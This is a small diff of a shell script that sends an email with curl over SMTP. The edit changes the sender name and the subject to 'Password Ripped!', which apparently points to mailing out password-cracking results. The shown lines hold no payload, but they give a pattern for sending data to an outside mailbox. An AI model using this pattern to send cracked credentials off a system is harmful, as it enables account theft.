@@ -4,9 +4,9 @@ curl --ssl-reqd \
 --mail-from clonevol1@gmail.com \
 --mail-rcpt longnghia2.00@gmail.com \
 --upload-file - <<EOF
-From: RIPPER <clonevol1@gmail.com>
+From: Paul The Ripper <clonevol1@gmail.com>
 To: LONGNGHIA <longnghia2.00@gmail.com>
-Subject: John The Ripper!
+Subject: Password Ripped!
 Content-Type: multipart/alternative; boundary="boundary-string"
 
 --boundary-string
